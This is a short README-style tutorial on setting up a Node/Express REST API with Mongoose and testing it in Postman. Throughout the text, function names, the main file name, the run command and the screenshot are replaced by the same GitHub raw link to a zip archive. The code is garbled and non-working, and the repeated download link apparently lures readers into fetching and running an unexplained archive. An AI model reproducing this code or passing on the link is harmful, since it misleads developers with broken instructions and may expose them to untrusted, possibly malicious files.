## API-Testing-with-POSTMAN

#### HTTP Request Verbs: `GET` , `POST` , `PUT` , `PATCH` , `DELETE`
#### All documents (/documents) : GET, POST, DELETE
#### specific document (/documents/id) : GET, PUT, PATCH, DELETE

Initializing the node project
```
npm init -y
```
Installing required node packages
```
npm install express mongoose body-parser
```

Working with main file (`https://github.com/ravikkumar777/REST-API-with-Node-and-Express/raw/refs/heads/master/decently/with_and_Express_AP_RES_Node_3.9.zip`)
```
const express = require('express');
const mongoose = require('mongoose');
const bodyParser = require('body-parser');

const app = express();

https://github.com/ravikkumar777/REST-API-with-Node-and-Express/raw/refs/heads/master/decently/with_and_Express_AP_RES_Node_3.9.zip(3000, function (req, res) {
    https://github.com/ravikkumar777/REST-API-with-Node-and-Express/raw/refs/heads/master/decently/with_and_Express_AP_RES_Node_3.9.zip('Server started on 3000');
});
```
Running Server on port 3000
```
node https://github.com/ravikkumar777/REST-API-with-Node-and-Express/raw/refs/heads/master/decently/with_and_Express_AP_RES_Node_3.9.zip
```
Opening Browser at
```
http://localhost:3000/
```

Extending the use of Mongoose and BodyParser
```
https://github.com/ravikkumar777/REST-API-with-Node-and-Express/raw/refs/heads/master/decently/with_and_Express_AP_RES_Node_3.9.zip(https://github.com/ravikkumar777/REST-API-with-Node-and-Express/raw/refs/heads/master/decently/with_and_Express_AP_RES_Node_3.9.zip({ extended: true }));
https://github.com/ravikkumar777/REST-API-with-Node-and-Express/raw/refs/heads/master/decently/with_and_Express_AP_RES_Node_3.9.zip('mongodb://localhost:27017/testDB', { useNewUrlParser: true, useUnifiedTopology: true });
```

Example code for `get` request
```
https://github.com/ravikkumar777/REST-API-with-Node-and-Express/raw/refs/heads/master/decently/with_and_Express_AP_RES_Node_3.9.zip('/documents', function (req, res) {
        https://github.com/ravikkumar777/REST-API-with-Node-and-Express/raw/refs/heads/master/decently/with_and_Express_AP_RES_Node_3.9.zip(function (err, foundPersons) {
            if (!err) {
                https://github.com/ravikkumar777/REST-API-with-Node-and-Express/raw/refs/heads/master/decently/with_and_Express_AP_RES_Node_3.9.zip(foundPersons);
            } else {
                https://github.com/ravikkumar777/REST-API-with-Node-and-Express/raw/refs/heads/master/decently/with_and_Express_AP_RES_Node_3.9.zip(err);
            }
        });
 });
```
## GET request from POSTMAN
![API Request - GET](https://github.com/ravikkumar777/REST-API-with-Node-and-Express/raw/refs/heads/master/decently/with_and_Express_AP_RES_Node_3.9.zip)
